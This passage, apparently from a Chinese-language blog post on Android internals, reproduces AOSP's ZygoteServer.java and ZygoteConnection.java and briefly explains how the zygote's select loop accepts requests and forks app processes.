// is returned.\n                        mIsForkChild = false;\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre> ZygoteServer.java\u5b8c\u6574\u6587\u4ef6 /frameworks/base/core/java/com/android/internal/os/ZygoteServer.java<pre><code>/*\n * Copyright (C) 2007 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage com.android.internal.os;\n\nimport static android.system.OsConstants.POLLIN;\n\nimport android.net.LocalServerSocket;\nimport android.net.LocalSocket;\nimport android.system.Os;\nimport android.system.ErrnoException;\nimport android.system.StructPollfd;\nimport android.util.Log;\n\nimport android.util.Slog;\nimport java.io.IOException;\nimport java.io.FileDescriptor;\nimport java.util.ArrayList;\n\n/**\n * Server socket class for zygote processes.\n *\n * Provides functions to wait for commands on a UNIX domain socket, and fork\n * off child processes that inherit the initial state of the VM.%\n *\n * Please see {@link ZygoteConnection.Arguments} for documentation on the\n * client protocol.\n */\nclass ZygoteServer {\n    public static final String TAG = \"ZygoteServer\";\n\n    private static final String ANDROID_SOCKET_PREFIX = \"ANDROID_SOCKET_\";\n\n    /**\n     * Listening socket that accepts new server connections.\n     */\n    private LocalServerSocket mServerSocket;\n\n    /**\n     * Whether or not mServerSocket's underlying FD should be closed directly.\n     * If mServerSocket is created with an existing FD, closing the socket does\n     * not close the FD and it must be closed explicitly. If the socket is created\n     * with a name instead, then closing the socket will close the underlying FD\n     * and it should not be double-closed.\n     */\n    private boolean mCloseSocketFd;\n\n    /**\n     * Set by the child process, immediately after a call to {@code Zygote.forkAndSpecialize}.\n     */\n    private boolean mIsForkChild;\n\n    ZygoteServer() {\n    }\n\n    void setForkChild() {\n        mIsForkChild = true;\n    }\n\n    /**\n     * Registers a server socket for zygote command connections. This locates the server socket\n     * file descriptor through an ANDROID_SOCKET_ environment variable.\n     *\n     * @throws RuntimeException when open fails\n     */\n    void registerServerSocketFromEnv(String socketName) {\n        if (mServerSocket == null) {\n            int fileDesc;\n            final String fullSocketName = ANDROID_SOCKET_PREFIX + socketName;\n            try {\n                String env = System.getenv(fullSocketName);\n                fileDesc = Integer.parseInt(env);\n            } catch (RuntimeException ex) {\n                throw new RuntimeException(fullSocketName + \" unset or invalid\", ex);\n            }\n\n            try {\n                FileDescriptor fd = new FileDescriptor();\n                fd.setInt$(fileDesc);\n                mServerSocket = new LocalServerSocket(fd);\n                mCloseSocketFd = true;\n            } catch (IOException ex) {\n                throw new RuntimeException(\n                        \"Error binding to local socket '\" + fileDesc + \"'\", ex);\n            }\n        }\n    }\n\n    /**\n     * Registers a server socket for zygote command connections. This opens the server socket\n     * at the specified name in the abstract socket namespace.\n     */\n    void registerServerSocketAtAbstractName(String socketName) {\n        if (mServerSocket == null) {\n            try {\n                mServerSocket = new LocalServerSocket(socketName);\n                mCloseSocketFd = false;\n            } catch (IOException ex) {\n                throw new RuntimeException(\n                        \"Error binding to abstract socket '\" + socketName + \"'\", ex);\n            }\n        }\n    }\n\n    /**\n     * Waits for and accepts a single command connection. Throws\n     * RuntimeException on failure.\n     */\n    private ZygoteConnection acceptCommandPeer(String abiList) {\n        try {\n            return createNewConnection(mServerSocket.accept(), abiList);\n        } catch (IOException ex) {\n            throw new RuntimeException(\n                    \"IOException during accept()\", ex);\n        }\n    }\n\n    protected ZygoteConnection createNewConnection(LocalSocket socket, String abiList)\n            throws IOException {\n        return new ZygoteConnection(socket, abiList);\n    }\n\n    /**\n     * Close and clean up zygote sockets. Called on shutdown and on the\n     * child's exit path.\n     */\n    void closeServerSocket() {\n        try {\n            if (mServerSocket != null) {\n                FileDescriptor fd = mServerSocket.getFileDescriptor();\n                mServerSocket.close();\n                if (fd != null &amp;&amp; mCloseSocketFd) {\n                    Os.close(fd);\n                }\n            }\n        } catch (IOException ex) {\n            Log.e(TAG, \"Zygote:  error closing sockets\", ex);\n        } catch (ErrnoException ex) {\n            Log.e(TAG, \"Zygote:  error closing descriptor\", ex);\n        }\n\n        mServerSocket = null;\n    }\n\n    /**\n     * Return the server socket's underlying file descriptor, so that\n     * ZygoteConnection can pass it to the native code for proper\n     * closure after a child process is forked off.\n     */\n\n    FileDescriptor getServerSocketFileDescriptor() {\n        return mServerSocket.getFileDescriptor();\n    }\n\n    /**\n     * Runs the zygote process's select loop. Accepts new connections as\n     * they happen, and reads commands from connections one spawn-request's\n     * worth at a time.\n     */\n    Runnable runSelectLoop(String abiList) {\n        ArrayList&lt;FileDescriptor&gt; fds = new ArrayList&lt;FileDescriptor&gt;();\n        ArrayList&lt;ZygoteConnection&gt; peers = new ArrayList&lt;ZygoteConnection&gt;();\n\n        fds.add(mServerSocket.getFileDescriptor());\n        peers.add(null);\n\n        while (true) {\n            StructPollfd[] pollFds = new StructPollfd[fds.size()];\n            for (int i = 0; i &lt; pollFds.length; ++i) {\n                pollFds[i] = new StructPollfd();\n                pollFds[i].fd = fds.get(i);\n                pollFds[i].events = (short) POLLIN;\n            }\n            try {\n                Os.poll(pollFds, -1);\n            } catch (ErrnoException ex) {\n                throw new RuntimeException(\"poll failed\", ex);\n            }\n            for (int i = pollFds.length - 1; i &gt;= 0; --i) {\n                if ((pollFds[i].revents &amp; POLLIN) == 0) {\n                    continue;\n                }\n\n                if (i == 0) {\n                    ZygoteConnection newPeer = acceptCommandPeer(abiList);\n                    peers.add(newPeer);\n                    fds.add(newPeer.getFileDesciptor());\n                } else {\n                    try {\n                        ZygoteConnection connection = peers.get(i);\n                        final Runnable command = connection.processOneCommand(this);\n\n                        if (mIsForkChild) {\n                            // We're in the child. We should always have a command to run at this\n                            // stage if processOneCommand hasn't called \"exec\".\n                            if (command == null) {\n                                throw new IllegalStateException(\"command == null\");\n                            }\n\n                            return command;\n                        } else {\n                            // We're in the server - we should never have any commands to run.\n                            if (command != null) {\n                                throw new IllegalStateException(\"command != null\");\n                            }\n\n                            // We don't know whether the remote side of the socket was closed or\n                            // not until we attempt to read from it from processOneCommand. This shows up as\n                            // a regular POLLIN event in our regular processing loop.\n                            if (connection.isClosedByPeer()) {\n                                connection.closeSocket();\n                                peers.remove(i);\n                                fds.remove(i);\n                            }\n                        }\n                    } catch (Exception e) {\n                        if (!mIsForkChild) {\n                            // We're in the server so any exception here is one that has taken place\n                            // pre-fork while processing commands or reading / writing from the\n                            // control socket. Make a loud noise about any such exceptions so that\n                            // we know exactly what failed and why.\n\n                            Slog.e(TAG, \"Exception executing zygote command: \", e);\n\n                            // Make sure the socket is closed so that the other end knows immediately\n                            // that something has gone wrong and doesn't time out waiting for a\n                            // response.\n                            ZygoteConnection conn = peers.remove(i);\n                            conn.closeSocket();\n\n                            fds.remove(i);\n                        } else {\n                            // We're in the child so any exception caught here has happened post\n                            // fork and before we execute ActivityThread.main (or any other main()\n                            // method). Log the details of the exception and bring down the process.\n                            Log.e(TAG, \"Caught post-fork exception in child process.\", e);\n                            throw e;\n                        }\n                    } finally {\n                        // Reset the child flag, in the event that the child process is a child-\n                        // zygote. The flag will not be consulted this loop pass after the Runnable\n                        // is returned.\n                        mIsForkChild = false;\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa runSelectLoop \u65b9\u6cd5\u8d1f\u8d23\u76d1\u542c\u548c\u7ba1\u7406\u8bf7\u6c42\uff0c\u5177\u4f53 fork \u903b\u8f91\u5728 ZygoteConnection \u65b9\u6cd5\u4e2d\uff1a</p> /frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java<pre><code>// \u53ef\u4ee5\u770b\u5230\u8c03\u7528 Native \u5c42\u7684 fork \u903b\u8f91 line 234:237 hl_lines=\"234-237\"\n        pid = Zygote.forkAndSpecialize(parsedArgs.uid, parsedArgs.gid, parsedArgs.gids,\n                parsedArgs.runtimeFlags, rlimits, parsedArgs.mountExternal, parsedArgs.seInfo,\n                parsedArgs.niceName, fdsToClose, fdsToIgnore, parsedArgs.startChildZygote,\n                parsedArgs.instructionSet, parsedArgs.appDataDir);\n</code></pre> ZygoteConnection.java\u5b8c\u6574\u6587\u4ef6 /frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java<pre><code>/*\n * Copyright (C) 2007 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage com.android.internal.os;\n\nimport static android.system.OsConstants.F_SETFD;\nimport static android.system.OsConstants.O_CLOEXEC;\nimport static android.system.OsConstants.POLLIN;\nimport static android.system.OsConstants.STDERR_FILENO;\nimport static android.system.OsConstants.STDIN_FILENO;\nimport static android.system.OsConstants.STDOUT_FILENO;\nimport static com.android.internal.os.ZygoteConnectionConstants.CONNECTION_TIMEOUT_MILLIS;\nimport static com.android.internal.os.ZygoteConnectionConstants.MAX_ZYGOTE_ARGC;\nimport static com.android.internal.os.ZygoteConnectionConstants.WRAPPED_PID_TIMEOUT_MILLIS;\n\nimport android.net.Credentials;\nimport android.net.LocalSocket;\nimport android.os.FactoryTest;\nimport android.os.Process;\nimport android.os.SystemProperties;\nimport android.os.Trace;\nimport android.system.ErrnoException;\nimport android.system.Os;\nimport android.system.StructPollfd;\nimport android.util.Log;\nimport dalvik.system.VMRuntime;\nimport java.io.BufferedReader;\nimport java.io.ByteArrayInputStream;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.EOFException;\nimport java.io.FileDescriptor;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.Arrays;\n\nimport libcore.io.IoUtils;\n\n/**\n * A connection that can make spawn requests.\n */\nclass ZygoteConnection {\n    private static final String TAG = \"Zygote\";\n\n    /** a prototype instance for a future List.toArray() */\n    private static final int[][] intArray2d = new int[0][0];\n\n    /**\n     * The command socket.\n     *\n     * mSocket is retained in the child process in \"peer wait\" mode, so\n     * that it closes when the child process terminates. In other cases,\n     * it is closed in the peer.\n     */\n    private final LocalSocket mSocket;\n    private final DataOutputStream mSocketOutStream;\n    private final BufferedReader mSocketReader;\n    private final Credentials peer;\n    private final String abiList;\n    private boolean isEof;\n\n    /**\n     * Constructs instance from connected socket.\n     *\n     * @param socket non-null; connected socket\n     * @param abiList non-null; a list of ABIs this zygote supports.\n     * @throws IOException\n     */\n    ZygoteConnection(LocalSocket socket, String abiList) throws IOException {\n        mSocket = socket;\n        this.abiList = abiList;\n\n        mSocketOutStream\n                = new DataOutputStream(socket.getOutputStream());\n\n        mSocketReader = new BufferedReader(\n                new InputStreamReader(socket.getInputStream()), 256);\n\n        mSocket.setSoTimeout(CONNECTION_TIMEOUT_MILLIS);\n\n        try {\n            peer = mSocket.getPeerCredentials();\n        } catch (IOException ex) {\n            Log.e(TAG, \"Cannot read peer credentials\", ex);\n            throw ex;\n        }\n\n        isEof = false;\n    }\n\n    /**\n     * Returns the file descriptor of the associated socket.\n     *\n     * @return null-ok; file descriptor\n     */\n    FileDescriptor getFileDesciptor() {\n        return mSocket.getFileDescriptor();\n    }\n\n    /**\n     * Reads one start command from the command socket. If successful, a child is forked and a\n     * {@code Runnable} that calls the childs main method (or equivalent) is returned in the child\n     * process. {@code null} is always returned in the parent process (the zygote).\n     *\n     * If the client closes the socket, an {@code EOF} condition is set, which callers can test\n     * for by calling {@code ZygoteConnection.isClosedByPeer}.\n     */\n    Runnable processOneCommand(ZygoteServer zygoteServer) {\n        String args[];\n        Arguments parsedArgs = null;\n        FileDescriptor[] descriptors;\n\n        try {\n            args = readArgumentList();\n            descriptors = mSocket.getAncillaryFileDescriptors();\n        } catch (IOException ex) {\n            throw new IllegalStateException(\"IOException on command socket\", ex);\n        }\n\n        // readArgumentList returns null only when it has reached EOF with no available\n        // data to read. This will only happen when the remote socket has disconnected.\n        if (args == null) {\n            isEof = true;\n            return null;\n        }\n\n        int pid = -1;\n        FileDescriptor childPipeFd = null;\n        FileDescriptor serverPipeFd = null;\n\n        parsedArgs = new Arguments(args);\n\n        if (parsedArgs.abiListQuery) {\n            handleAbiListQuery();\n            return null;\n        }\n\n        if (parsedArgs.preloadDefault) {\n            handlePreload();\n            return null;\n        }\n\n        if (parsedArgs.preloadPackage != null) {\n            handlePreloadPackage(parsedArgs.preloadPackage, parsedArgs.preloadPackageLibs,\n                    parsedArgs.preloadPackageLibFileName, parsedArgs.preloadPackageCacheKey);\n            return null;\n        }\n\n        if (parsedArgs.apiBlacklistExemptions != null) {\n            handleApiBlacklistExemptions(parsedArgs.apiBlacklistExemptions);\n            return null;\n        }\n\n        if (parsedArgs.hiddenApiAccessLogSampleRate != -1) {\n            handleHiddenApiAccessLogSampleRate(parsedArgs.hiddenApiAccessLogSampleRate);\n            return null;\n        }\n\n        if (parsedArgs.permittedCapabilities != 0 || parsedArgs.effectiveCapabilities != 0) {\n            throw new ZygoteSecurityException(\"Client may not specify capabilities: \" +\n                    \"permitted=0x\" + Long.toHexString(parsedArgs.permittedCapabilities) +\n                    \", effective=0x\" + Long.toHexString(parsedArgs.effectiveCapabilities));\n        }\n\n        applyUidSecurityPolicy(parsedArgs, peer);\n        applyInvokeWithSecurityPolicy(parsedArgs, peer);\n\n        applyDebuggerSystemProperty(parsedArgs);\n        applyInvokeWithSystemProperty(parsedArgs);\n\n        int[][] rlimits = null;\n\n        if (parsedArgs.rlimits != null) {\n            rlimits = parsedArgs.rlimits.toArray(intArray2d);\n        }\n\n        int[] fdsToIgnore = null;\n\n        if (parsedArgs.invokeWith != null) {\n            try {\n                FileDescriptor[] pipeFds = Os.pipe2(O_CLOEXEC);\n                childPipeFd = pipeFds[1];\n                serverPipeFd = pipeFds[0];\n                Os.fcntlInt(childPipeFd, F_SETFD, 0);\n                fdsToIgnore = new int[]{childPipeFd.getInt$(), serverPipeFd.getInt$()};\n            } catch (ErrnoException errnoEx) {\n                throw new IllegalStateException(\"Unable to set up pipe for invoke-with\", errnoEx);\n            }\n        }\n\n        /**\n         * In order to avoid leaking descriptors to the Zygote child,\n         * the native code must close the two Zygote socket descriptors\n         * in the child process before it switches from Zygote-root to\n         * the UID and privileges of the application being launched.\n         *\n         * In order to avoid \"bad file descriptor\" errors when the\n         * two LocalSocket objects are closed, the Posix file\n         * descriptors are released via a dup2() call which closes\n         * the socket and substitutes an open descriptor to /dev/null.\n         */\n\n        int [] fdsToClose = { -1, -1 };\n\n        FileDescriptor fd = mSocket.getFileDescriptor();\n\n        if (fd != null) {\n            fdsToClose[0] = fd.getInt$();\n        }\n\n        fd = zygoteServer.getServerSocketFileDescriptor();\n\n        if (fd != null) {\n            fdsToClose[1] = fd.getInt$();\n        }\n\n        fd = null;\n\n        pid = Zygote.forkAndSpecialize(parsedArgs.uid, parsedArgs.gid, parsedArgs.gids,\n                parsedArgs.runtimeFlags, rlimits, parsedArgs.mountExternal, parsedArgs.seInfo,\n                parsedArgs.niceName, fdsToClose, fdsToIgnore, parsedArgs.startChildZygote,\n                parsedArgs.instructionSet, parsedArgs.appDataDir);\n\n        try {\n            if (pid == 0) {\n                // in child\n                zygoteServer.setForkChild();\n\n                zygoteServer.closeServerSocket();\n                IoUtils.closeQuietly(serverPipeFd);\n                serverPipeFd = null;\n\n                return handleChildProc(parsedArgs, descriptors, childPipeFd,\n                        parsedArgs.startChildZygote);\n            } else {\n                // In the parent. A pid &lt; 0 indicates a failure and will be handled in\n                // handleParentProc.\n                IoUtils.closeQuietly(childPipeFd);\n                childPipeFd = null;\n                handleParentProc(pid, descriptors, serverPipeFd);\n                return null;\n            }\n        } finally {\n            IoUtils.closeQuietly(childPipeFd);\n            IoUtils.closeQuietly(serverPipeFd);\n        }\n    }\n\n    private void handleAbiListQuery() {\n        try {\n            final byte[] abiListBytes = abiList.getBytes(StandardCharsets.US_ASCII);\n            mSocketOutStream.writeInt(abiListBytes.length);\n            mSocketOutStream.write(abiListBytes);\n        } catch (IOException ioe) {\n            throw new IllegalStateException(\"Error writing to command socket\", ioe);\n        }\n    }\n\n    /**\n     * Preloads resources if the zygote is in lazily preload mode. Writes the result of the\n     * preload operation; {@code 0} when a preload was initiated due to this request and {@code 1}\n     * if no preload was initiated. The latter implies that the zygote is not configured to load\n     * resources lazy or that the zygote has already handled a previous request to handlePreload.\n     */\n    private void handlePreload() {\n        try {\n            if (isPreloadComplete()) {\n                mSocketOutStream.writeInt(1);\n            } else {\n                preload();\n                mSocketOutStream.writeInt(0);\n            }\n        } catch (IOException ioe) {\n            throw new IllegalStateException(\"Error writing to command socket\", ioe);\n        }\n    }\n\n    private void handleApiBlacklistExemptions(String[] exemptions) {\n        try {\n            ZygoteInit.setApiBlacklistExemptions(exemptions);\n            mSocketOutStream.writeInt(0);\n        } catch (IOException ioe) {\n            throw new IllegalStateException(\"Error writing to command socket\", ioe);\n        }\n    }\n\n    private void handleHiddenApiAccessLogSampleRate(int percent) {\n        try {\n            ZygoteInit.setHiddenApiAccessLogSampleRate(percent);\n            mSocketOutStream.writeInt(0);\n        } catch (IOException ioe) {\n            throw new IllegalStateException(\"Error writing to command socket\", ioe);\n        }\n    }\n\n    protected void preload() {\n        ZygoteInit.lazyPreload();\n    }\n\n    protected boolean isPreloadComplete() {\n        return ZygoteInit.isPreloadComplete();\n    }\n\n    protected DataOutputStream getSocketOutputStream() {\n        return mSocketOutStream;\n    }\n\n    protected void handlePreloadPackage(String packagePath, String libsPath, String libFileName,\n            String cacheKey) {\n        throw new RuntimeException(\"Zyogte does not support package preloading\");\n    }\n\n    /**\n     * Closes socket associated with this connection.\n     */\n    void closeSocket() {\n        try {\n            mSocket.close();\n        } catch (IOException ex) {\n            Log.e(TAG, \"Exception while closing command \"\n                    + \"socket in parent\", ex);\n        }\n    }\n\n    boolean isClosedByPeer() {\n        return isEof;\n    }\n\n    /**\n     * Handles argument parsing for args related to the zygote spawner.\n     *\n     * Current recognized args:\n     * &lt;ul&gt;\n     *   &lt;li&gt; --setuid=&lt;i&gt;uid of child process, defaults to 0&lt;/i&gt;\n     *   &lt;li&gt; --setgid=&lt;i&gt;gid of child process, defaults to 0&lt;/i&gt;\n     *   &lt;li&gt; --setgroups=&lt;i&gt;comma-separated list of supplimentary gid's&lt;/i&gt;\n     *   &lt;li&gt; --capabilities=&lt;i&gt;a pair of comma-separated integer strings\n     * indicating Linux capabilities(2) set for child. The first string\n     * represents the &lt;code&gt;permitted&lt;/code&gt; set, and the second the\n     * &lt;code&gt;effective&lt;/code&gt; set. Precede each with 0 or\n     * 0x for octal or hexidecimal value. If unspecified, both default to 0.\n     * This parameter is only applied if the uid of the new process will\n     * be non-0. &lt;/i&gt;\n     *   &lt;li&gt; --rlimit=r,c,m&lt;i&gt;tuple of values for setrlimit() call.\n     *    &lt;code&gt;r&lt;/code&gt; is the resource, &lt;code&gt;c&lt;/code&gt; and &lt;code&gt;m&lt;/code&gt;\n     *    are the settings for current and max value.&lt;/i&gt;\n     *   &lt;li&gt; --instruction-set=&lt;i&gt;instruction-set-string&lt;/i&gt; which instruction set to use/emulate.\n     *   &lt;li&gt; --nice-name=&lt;i&gt;nice name to appear in ps&lt;/i&gt;\n     *   &lt;li&gt; --runtime-args indicates that the remaining arg list should\n     * be handed off to com.android.internal.os.RuntimeInit, rather than\n     * processed directly.\n     * Android runtime startup (eg, Binder initialization) is also eschewed.\n     *   &lt;li&gt; [--] &amp;lt;args for RuntimeInit &amp;gt;\n     * &lt;/ul&gt;\n     */\n    static class Arguments {\n        /** from --setuid */\n        int uid = 0;\n        boolean uidSpecified;\n\n        /** from --setgid */\n        int gid = 0;\n        boolean gidSpecified;\n\n        /** from --setgroups */\n        int[] gids;\n\n        /**\n         * From --runtime-flags.\n         */\n        int runtimeFlags;\n\n        /** From --mount-external */\n        int mountExternal = Zygote.MOUNT_EXTERNAL_NONE;\n\n        /** from --target-sdk-version. */\n        int targetSdkVersion;\n        boolean targetSdkVersionSpecified;\n\n        /** from --nice-name */\n        String niceName;\n\n        /** from --capabilities */\n        boolean capabilitiesSpecified;\n        long permittedCapabilities;\n        long effectiveCapabilities;\n\n        /** from --seinfo */\n        boolean seInfoSpecified;\n        String seInfo;\n\n        /** from all --rlimit=r,c,m */\n        ArrayList&lt;int[]&gt; rlimits;\n\n        /** from --invoke-with */\n        String invokeWith;\n\n        /**\n         * Any args after and including the first non-option arg\n         * (or after a '--')\n         */\n        String remainingArgs[];\n\n        /**\n         * Whether the current arguments constitute an ABI list query.\n         */\n        boolean abiListQuery;\n\n        /**\n         * The instruction set to use, or null when not important.\n         */\n        String instructionSet;\n\n        /**\n         * The app data directory. May be null, e.g., for the system server. Note that this might\n         * not be reliable in the case of process-sharing apps.\n         */\n        String appDataDir;\n\n        /**\n         * The APK path of the package to preload, when using --preload-package.\n         */\n        String preloadPackage;\n\n        /**\n         * The native library path of the package to preload, when using --preload-package.\n         */\n        String preloadPackageLibs;\n\n        /**\n         * The filename of the native library to preload, when using --preload-package.\n         */\n        String preloadPackageLibFileName;\n\n        /**\n         * The cache key under which to enter the preloaded package into the classloader cache,\n         * when using --preload-package.\n         */\n        String preloadPackageCacheKey;\n\n        /**\n         * Whether this is a request to start preloading the default resources and classes.\n         * This argument only makes sense when the zygote is in lazy preload mode (i.e, when\n         * it's started with --enable-lazy-preload).\n         */\n        boolean preloadDefault;\n\n        /**\n         * Whether this is a request to start a zygote process as a child of this zygote.\n         * Set with --start-child-zygote. The remaining arguments must include the\n         * CHILD_ZYGOTE_SOCKET_NAME_ARG flag to indicate the abstract socket name that\n         * should be used for communication.\n         */\n        boolean startChildZygote;\n\n        /**\n         * Exemptions from API blacklisting. These are sent to the pre-forked zygote at boot time,\n         * or when they change, via --set-api-blacklist-exemptions.\n         */\n        String[] apiBlacklistExemptions;\n\n        /**\n         * Sampling rate for logging hidden API accesses to the event log. This is sent to the\n         * pre-forked zygote at boot time, or when it changes, via --hidden-api-log-sampling-rate.\n         */\n        int hiddenApiAccessLogSampleRate = -1;\n\n        /**\n         * Constructs instance and parses args\n         * @param args zygote command-line args\n         * @throws IllegalArgumentException\n         */\n        Arguments(String args[]) throws IllegalArgumentException {\n            parseArgs(args);\n        }\n\n        /**\n         * Parses the commandline arguments intended for the Zygote spawner\n         * (such as \"--setuid=\" and \"--setgid=\") and creates an array\n         * containing the remaining args.\n         *\n         * Per security review bug #1112214, duplicate args are disallowed in\n         * critical cases to make injection harder.\n         */\n        private void parseArgs(String args[])\n                throws IllegalArgumentException {\n            int curArg = 0;\n\n            boolean seenRuntimeArgs = false;\n\n            boolean expectRuntimeArgs = true;\n            for ( /* curArg */ ; curArg &lt; args.length; curArg++) {\n                String arg = args[curArg];\n\n                if (arg.equals(\"--\")) {\n                    curArg++;\n                    break;\n                } else if (arg.startsWith(\"--setuid=\")) {\n                    if (uidSpecified) {\n                        throw new IllegalArgumentException(\n                                \"Duplicate arg specified\");\n                    }\n                    uidSpecified = true;\n                    uid = Integer.parseInt(\n                            arg.substring(arg.indexOf('=') + 1));\n                } else if (arg.startsWith(\"--setgid=\")) {\n                    if (gidSpecified) {\n                        throw new IllegalArgumentException(\n                                \"Duplicate arg specified\");\n                    }\n                    gidSpecified = true;\n                    gid = Integer.parseInt(\n                            arg.substring(arg.indexOf('=') + 1));\n                } else if (arg.startsWith(\"--target-sdk-version=\")) {\n                    if (targetSdkVersionSpecified) {\n                        throw new IllegalArgumentException(\n                                \"Duplicate target-sdk-version specified\");\n                    }\n                    targetSdkVersionSpecified = true;\n                    targetSdkVersion = Integer.parseInt(\n                            arg.substring(arg.indexOf('=') + 1));\n                } else if (arg.equals(\"--runtime-args\")) {\n                    seenRuntimeArgs = true;\n                } else if (arg.startsWith(\"--runtime-flags=\")) {\n                    runtimeFlags = Integer.parseInt(\n                            arg.substring(arg.indexOf('=') + 1));\n                } else if (arg.startsWith(\"--seinfo=\")) {\n                    if (seInfoSpecified) {\n                        throw new IllegalArgumentException(\n                                \"Duplicate arg specified\");\n                    }\n                    seInfoSpecified = true;\n                    seInfo = arg.substring(arg.indexOf('=') + 1);\n                } else if (arg.startsWith(\"--capabilities=\")) {\n                    if (capabilitiesSpecified) {\n                        throw new IllegalArgumentException(\n                                \"Duplicate arg specified\");\n                    }\n                    capabilitiesSpecified = true;\n                    String capString = arg.substring(arg.indexOf('=')+1);\n\n                    String[] capStrings = capString.split(\",\", 2);\n\n                    if (capStrings.length == 1) {\n                        effectiveCapabilities = Long.decode(capStrings[0]);\n                        permittedCapabilities = effectiveCapabilities;\n                    } else {\n                        permittedCapabilities = Long.decode(capStrings[0]);\n                        effectiveCapabilities = Long.decode(capStrings[1]);\n                    }\n                } else if (arg.startsWith(\"--rlimit=\")) {\n                    // Duplicate --rlimit arguments are specifically allowed.\n                    String[] limitStrings\n                            = arg.substring(arg.indexOf('=')+1).split(\",\");\n\n                    if (limitStrings.length != 3) {\n                        throw new IllegalArgumentException(\n                                \"--rlimit= should have 3 comma-delimited ints\");\n                    }\n                    int[] rlimitTuple = new int[limitStrings.length];\n\n                    for(int i=0; i &lt; limitStrings.length; i++) {\n                        rlimitTuple[i] = Integer.parseInt(limitStrings[i]);\n                    }\n\n                    if (rlimits == null) {\n                        rlimits = new ArrayList();\n                    }\n\n                    rlimits.add(rlimitTuple);\n                } else if (arg.startsWith(\"--setgroups=\")) {\n                    if (gids != null) {\n                        throw new IllegalArgumentException(\n                                \"Duplicate arg specified\");\n                    }\n\n                    String[] params\n                            = arg.substring(arg.indexOf('=') + 1).split(\",\");\n\n                    gids = new int[params.length];\n\n                    for (int i = params.length - 1; i &gt;= 0 ; i--) {\n                        gids[i] = Integer.parseInt(params[i]);\n                    }\n                } else if (arg.equals(\"--invoke-with\")) {\n                    if (invokeWith != null) {\n                        throw new IllegalArgumentException(\n                                \"Duplicate arg specified\");\n                    }\n                    try {\n                        invokeWith = args[++curArg];\n                    } catch (IndexOutOfBoundsException ex) {\n                        throw new IllegalArgumentException(\n                                \"--invoke-with requires argument\");\n                    }\n                } else if (arg.startsWith(\"--nice-name=\")) {\n                    if (niceName != null) {\n                        throw new IllegalArgumentException(\n                                \"Duplicate arg specified\");\n                    }\n                    niceName = arg.substring(arg.indexOf('=') + 1);\n                } else if (arg.equals(\"--mount-external-default\")) {\n                    mountExternal = Zygote.MOUNT_EXTERNAL_DEFAULT;\n                } else if (arg.equals(\"--mount-external-read\")) {\n                    mountExternal = Zygote.MOUNT_EXTERNAL_READ;\n                } else if (arg.equals(\"--mount-external-write\")) {\n                    mountExternal = Zygote.MOUNT_EXTERNAL_WRITE;\n                } else if (arg.equals(\"--query-abi-list\")) {\n                    abiListQuery = true;\n                } else if (arg.startsWith(\"--instruction-set=\")) {\n                    instructionSet = arg.substring(arg.indexOf('=') + 1);\n                } else if (arg.startsWith(\"--app-data-dir=\")) {\n                    appDataDir = arg.substring(arg.indexOf('=') + 1);\n                } else if (arg.equals(\"--preload-package\")) {\n                    preloadPackage = args[++curArg];\n                    preloadPackageLibs = args[++curArg];\n                    preloadPackageLibFileName = args[++curArg];\n                    preloadPackageCacheKey = args[++curArg];\n                } else if (arg.equals(\"--preload-default\")) {\n                    preloadDefault = true;\n                    expectRuntimeArgs = false;\n                } else if (arg.equals(\"--start-child-zygote\")) {\n                    startChildZygote = true;\n                } else if (arg.equals(\"--set-api-blacklist-exemptions\")) {\n                    // consume all remaining args; this is a stand-alone command, never included\n                    // with the regular fork command.\n                    apiBlacklistExemptions = Arrays.copyOfRange(args, curArg + 1, args.length);\n                    curArg = args.length;\n                    expectRuntimeArgs = false;\n                } else if (arg.startsWith(\"--hidden-api-log-sampling-rate=\")) {\n                    String rateStr = arg.substring(arg.indexOf('=') + 1);\n                    try {\n                        hiddenApiAccessLogSampleRate = Integer.parseInt(rateStr);\n                    } catch (NumberFormatException nfe) {\n                        throw new IllegalArgumentException(\n                                \"Invalid log sampling rate: \" + rateStr, nfe);\n                    }\n                    expectRuntimeArgs = false;\n                } else {\n                    break;\n                }\n            }\n\n            if (abiListQuery) {\n                if (args.length - curArg &gt; 0) {\n                    throw new IllegalArgumentException(\"Unexpected arguments after --query-abi-list.\");\n                }\n            } else if (preloadPackage != null) {\n                if (args.length - curArg &gt; 0) {\n                    throw new IllegalArgumentException(\n                            \"Unexpected arguments after --preload-package.\");\n                }\n            } else if (expectRuntimeArgs) {\n                if (!seenRuntimeArgs) {\n                    throw new IllegalArgumentException(\"Unexpected argument : \" + args[curArg]);\n                }\n\n                remainingArgs = new String[args.length - curArg];\n                System.arraycopy(args, curArg, remainingArgs, 0, remainingArgs.length);\n            }\n\n            if (startChildZygote) {\n                boolean seenChildSocketArg = false;\n                for (String arg : remainingArgs) {\n                    if (arg.startsWith(Zygote.CHILD_ZYGOTE_SOCKET_NAME_ARG)) {\n                        seenChildSocketArg = true;\n                        break;\n                    }\n                }\n                if (!seenChildSocketArg) {\n                    throw new IllegalArgumentException(\"--start-child-zygote specified \" +\n                            \"without \" + Zygote.CHILD_ZYGOTE_SOCKET_NAME_ARG);\n                }\n            }\n        }\n    }\n\n    /**\n     * Reads an argument list from the command socket/\n     * @return Argument list or null if EOF is reached\n     * @throws IOException passed straight through\n     */\n    private String[] readArgumentList()\n            throws IOException {\n\n        /**\n         * See 